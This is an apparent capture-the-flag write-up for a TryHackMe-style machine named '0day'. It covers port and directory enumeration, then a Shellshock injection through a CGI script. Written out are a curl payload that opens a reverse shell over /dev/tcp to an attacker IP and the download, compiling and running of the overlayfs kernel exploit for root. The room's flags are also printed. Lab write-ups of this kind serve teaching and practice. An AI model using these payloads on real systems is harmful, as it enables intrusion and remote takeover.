<pre>
Machine IP: 10.10.42.125(0day)

Enum:
    Open ports:
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
|_  256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 0day


Enum port 80: (gobuster)
    /cgi-bin (Status: 301)
        /cgi-bin/test.cgi -> vuln to shellshock
/img (Status: 301)
/uploads (Status: 301)
/admin (Status: 301)
/css (Status: 301)
/js (Status: 301)
/backup (Status: 301)    
    /secret (Status: 301)

Exploit /cgi-bin/test.cgi
    Code exec:
        curl -H "User-Agent: () { :; };echo;echo; /bin/bash -c "whoami"" http://10.10.42.125/cgi-bin/test.cgi/
            www-data
    
    Reverse shell:
        rlwrap nc -lvnp 9003
        curl -H "User-Agent: () { :; };echo;echo; /bin/bash -i >& /dev/tcp/10.9.199.66/9003 0>&1" http://10.10.42.125/cgi-bin/test.cgi/
        

    Priv Esc: at /tmp/ dir because we are www-data
Kernel version:
Enum for linux = linpeas.sh
3.13.0-32-generic
exploit :
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation               | exploits/linux/local/37292.c
Download via http.server python linpeas.sh and exploit.c
Via wget..

Exploit:
    /tmp$ /usr/bin/gcc > compiler path
    /tmp$ export PATH=$PATH:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin

/tmp$ /usr/bin/gcc 37292.c > compile the exploit

/tmp $ ./a.out > run exploit and we got root!

User Flag: THM{Sh3llSh0ck_r0ckz}
Root Flag: THM{g00d_j0b_0day_is_Pleased}

    

R:
https://stackoverflow.com/questions/11912878/gcc-error-gcc-error-trying-to-exec-cc1-execvp-no-such-file-or-directory
,
https://stackoverflow.com/questions/35970824/gcc-collect2-fatal-error-cannot-find-ld
,
https://blog.cloudflare.com/inside-shellshock/
</pre>
